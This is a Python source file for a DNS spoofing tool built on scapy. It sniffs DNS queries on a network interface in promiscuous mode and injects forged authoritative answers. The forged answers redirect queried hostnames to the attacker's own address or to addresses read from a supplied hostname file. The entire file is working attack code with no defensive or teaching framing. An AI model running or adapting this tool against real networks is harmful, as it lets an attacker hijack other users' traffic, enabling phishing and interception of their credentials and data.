from scapy.all import *
from scapy.all import send as ssend
import netifaces as ni
import logging

conf.sniff_promisc=True
addr='127.0.0.1'
hostnames_specified = False
interface = 'enpOs3'
dns_holder = dict()
def poison_cache(pkt):
    global interface
    global hostnames_specified
    global addr
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:       
            query = pkt[DNS].qd
            pkt[UDP].chksum = None
            print("queryname: "+ str(query.qname))
            inmap = False
            for e in dns_holder.keys():
                if bytes(e.encode()) == query.qname:
                    inmap = True
                    newqname = e

            if hostnames_specified and inmap:
                poison_addr = dns_holder[newqname]
                print("Preparing spoofed packet")
            else:
                poison_addr = addr
            inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
            send(inject_packet, iface=interface)
            print('Sent:', inject_packet.summary())

def main():
    global interface
    global addr
    global hostnames_specified
    interface = ni.gateways()['default'][ni.AF_INET][1]
    addr = ni.ifaddresses(str(interface))[ni.AF_INET][0]['addr']
    command = sys.argv
    print(command)
    if "-h" in command:
        hostnamefile = command[command.index("-h")+1]
        hostnames_specified = True

    if "-i" in command:
        interface = command[command.index("-i")+1]

    if hostnames_specified:
        hf = open(hostnamefile, "r")
        for line in hf:
            ip_host = line.split(',')
            dns_holder[ip_host[1].strip() + "."] = str(ip_host[0]).strip()
    print("Poison Map: " + str(dns_holder))
    print("Sniffing on packets on interface: "+ str(interface))
    sniff(iface = interface,filter = 'port 53', prn = poison_cache, store = 0)
if __name__ == "__main__":
    main()

